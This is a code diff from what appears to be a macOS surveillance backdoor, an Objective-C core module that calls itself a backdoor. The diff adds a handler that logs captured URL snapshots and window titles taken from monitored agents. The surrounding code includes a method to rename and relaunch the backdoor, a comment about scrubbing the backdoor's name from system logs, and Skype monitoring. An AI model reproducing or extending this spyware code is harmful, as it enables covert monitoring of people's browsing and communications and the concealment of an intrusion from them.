@@ -46,8 +46,6 @@
 
 #define ICON_FILENAME  @"q45tyh"
 
-//#define DEBUG_CORE
-
 //
 // Old notification system
 //
@@ -181,18 +179,6 @@ static void computerWillShutdown(CFMachPortRef port,
 @interface RCSMCore (hidden)
 
 - (void)_renameBackdoorAndRelaunch;
-
-#if 0
-//
-// Create the Advisory Lock -- Not used as of now. Leaving it for future use
-//
-- (int)_createAdvisoryLock: (NSString *)lockFile;
-
-//
-// Remove the Advisory Lock -- Not used as of now. Leaving it for future use
-//
-- (int)_removeAdvisoryLock: (NSString *)lockFile;
-#endif
 
 //
 // Renames entries in /var/log/system.log which contains our backdoor name
@@ -678,7 +664,10 @@ static void computerWillShutdown(CFMachPortRef port,
       
       readData = [gSharedMemoryLogging readMemoryFromComponent: COMP_CORE
                                                       forAgent: 0
-                                               withCommandType: CM_LOG_DATA | CM_CLOSE_LOG_WITH_HEADER ];
+                                               withCommandType: CM_CREATE_LOG_HEADER
+                                                                | CM_LOG_DATA
+                                                                | CM_CLOSE_LOG
+                                                                | CM_CLOSE_LOG_WITH_HEADER];
       
       if (readData != nil)
         {
@@ -1239,6 +1228,105 @@ static void computerWillShutdown(CFMachPortRef port,
                 [fsManager release];
                 break;
               }
+            case LOG_URL_SNAPSHOT:
+              {
+#ifdef DEBUG_CORE
+                verboseLog(@"Logs from url snapshot");
+#endif
+
+                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
+                                                        length: shMemLog->commandDataSize];
+                urlSnapAdditionalStruct *_urlHeader = (urlSnapAdditionalStruct *)[logData bytes];
+
+                switch (shMemLog->commandType)
+                  {
+                  case CM_CREATE_LOG_HEADER:
+                    {
+#ifdef DEBUG_CORE
+                      infoLog(@"Creating log header for url snapshot (%d)", shMemLog->flag);
+#endif
+                      int additionalSize = sizeof(urlSnapAdditionalStruct)
+                                           + _urlHeader->urlNameLen
+                                           + _urlHeader->windowTitleLen;
+
+                      NSMutableData *urlSnapAdditionalHeader = [[NSMutableData alloc] initWithData:
+                                                                         [logData subdataWithRange: NSMakeRange(0, additionalSize)]];
+                      NSMutableData *urlSnapData = [[NSMutableData alloc] initWithData: [logData subdataWithRange:
+                        NSMakeRange([urlSnapAdditionalHeader length],
+                                    [logData length] - [urlSnapAdditionalHeader length])]];
+
+                      //
+                      // Create log here since we need to pass anAgentHeader as the
+                      // additional file header
+                      //
+                      if ([_logManager createLog: LOG_URL_SNAPSHOT
+                                     agentHeader: urlSnapAdditionalHeader
+                                       withLogID: shMemLog->flag] == TRUE)
+                        {
+                          if ([_logManager writeDataToLog: urlSnapData
+                                                 forAgent: LOG_URL_SNAPSHOT
+                                                withLogID: shMemLog->flag] == TRUE)
+                            {
+#ifdef DEBUG_CORE
+                              infoLog(@"Written first entry for URL snapshot (%d)", shMemLog->flag);
+#endif
+                            }
+                          else
+                            {
+#ifdef DEBUG_CORE
+                              errorLog(@"Error while writing first entry for URL snapshot");
+#endif
+                            }
+                        }
+                      else
+                        {
+#ifdef DEBUG_CORE
+                          errorLog(@"Error while creating URL snapshot log");
+#endif
+                        }
+
+                      [urlSnapAdditionalHeader release];
+                      [urlSnapData release];
+                    } break;
+                  case CM_LOG_DATA:
+                    {
+#ifdef DEBUG_CORE
+                      verboseLog(@"Received data for URL Snapshot");
+#endif
+                      if ([_logManager writeDataToLog: logData
+                                             forAgent: LOG_URL_SNAPSHOT
+                                            withLogID: shMemLog->flag] == TRUE)
+                        {
+#ifdef DEBUG_CORE
+                          verboseLog(@"Written data for URL snapshot");
+#endif
+                        }
+                      else
+                        {
+#ifdef DEBUG_CORE
+                          errorLog(@"Error while writing data for URL Snapshot (%d)", shMemLog->flag);
+#endif
+                        }
+                    } break;
+                  case CM_CLOSE_LOG:
+                    {
+#ifdef DEBUG_CORE
+                      infoLog(@"Closing log for url snapshot (%d)", shMemLog->flag);
+#endif
+
+                      [_logManager closeActiveLog: LOG_URL_SNAPSHOT
+                                        withLogID: shMemLog->flag];
+                    } break;
+                  default:
+                    {
+#ifdef DEBUG_CORE
+                      errorLog(@"Unknown command type from url snapshot");
+#endif
+                    }
+                  }
+
+                break;
+              }
             default:
               {
 #ifdef DEBUG_CORE
@@ -1295,7 +1383,7 @@ static void computerWillShutdown(CFMachPortRef port,
               if (x == 0)
                 warnLog(@"Skype is not running");
 #endif
-              [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.1]];
+              [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.01]];
             }
           
           [agentConfiguration release];
